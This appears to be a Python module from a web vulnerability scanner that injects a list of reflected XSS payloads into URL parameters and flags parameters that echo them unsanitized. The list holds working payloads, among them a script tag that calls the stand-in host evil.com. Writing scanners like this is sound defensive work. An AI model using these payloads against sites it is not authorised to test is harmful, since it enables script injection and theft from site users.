import httpx
from modules.scanner.base_check import BaseCheck, CheckResult


XSS_VARIANTS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "<video onloadstart=alert(1) src=x>",
    "<audio onloadstart=alert(1) src=x>",
    "javascript:alert(1)",
    "vbscript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "\" onmouseover=alert(1) \"",
    "'; alert(1); '",
    "<script>fetch('https://evil.com')</script>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
]


class XssVariantsCheck(BaseCheck):
    name = "active_xss_variants"

    async def run(self, base_request: dict, target_params: list[str]) -> list[CheckResult]:
        results = []
        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            for param in target_params:
                for payload in XSS_VARIANTS:
                    modified = self._inject_payload(base_request, param, payload)
                    try:
                        resp = await client.request(**modified)
                        if payload in resp.text and "text/html" in (resp.headers.get("content-type", "")):
                            results.append(CheckResult(
                                triggered=True,
                                severity="high",
                                title="Reflected XSS variant detected",
                                description=f"Parameter '{param}' reflects unsanitized input.",
                                evidence=f"Payload: {payload}\nStatus: {resp.status_code}",
                                remediation="Encode output based on context. Use Content-Security-Policy.",
                                cwe="CWE-79",
                            ))
                    except Exception:
                        continue
        return results

    def _inject_payload(self, base: dict, param: str, payload: str) -> dict:
        import copy
        import urllib.parse
        req = copy.deepcopy(base)
        parsed = urllib.parse.urlparse(req["url"])
        params = dict(urllib.parse.parse_qsl(parsed.query))
        params[param] = payload
        req["url"] = parsed._replace(query=urllib.parse.urlencode(params)).geturl()
        return req
